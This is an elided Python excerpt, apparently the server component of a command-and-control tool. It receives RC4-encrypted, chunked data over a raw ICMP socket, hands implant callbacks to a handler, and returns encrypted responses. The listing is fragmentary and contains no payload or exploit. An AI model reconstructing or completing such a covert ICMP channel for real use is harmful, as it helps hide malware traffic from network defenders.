...
from core.config import get_setting, Config
...
def get_icmp_data(socket):
    ...
    #logging.success("Recieved ICMP from {0} : Length {1}".format(source_addr[0], len(icmp_data)))
    ...
    icmp_data = encryption.rc4_crypt(icmp_data[2:], get_setting('encryption_key').encode())
...
def StartICMPServer(host):
    ...
    try:
        ...
        logging.error('Failed to open socket for ICMP server\n{0}'.format(error))
        sys.exit(1)
    ...
    while True:
        ...
        if in_wrapper.uid in inbound_queue.keys() or in_wrapper.total_chunks == 1:
            ...
            logging.success('ICMP Request - UID: {3} | Chunk: {0} | Total: {1} | DataLen: {2}'.format(in_wrapper.chunk_number, in_wrapper.total_chunks, len(in_wrapper.raw_data), in_wrapper.uid))
            ...
            if in_wrapper.chunk_number == in_wrapper.total_chunks: # This is the last one (or only one)
                ...
                response = throwback.handle_callback(inbound_data, 'ICMP', source_addr[0])
                ...
                if len(response) < CHUNK_SIZE:
                    ...
                    logging.success('Response chunking required - UID: {} | Total Size: {} | Chunks: {}'.format(uid, len(response), total_chunks))
            ...
            logging.success('UID: {} | Chunk {} of {} requested'.format(in_wrapper.uid, chunk_number, total_chunks))
        ...
        return_data = encryption.rc4_crypt(return_data, get_setting('encryption_key').encode())
        ...
        try:
            ...
            logging.error('General socket failure ({})'.format(error))
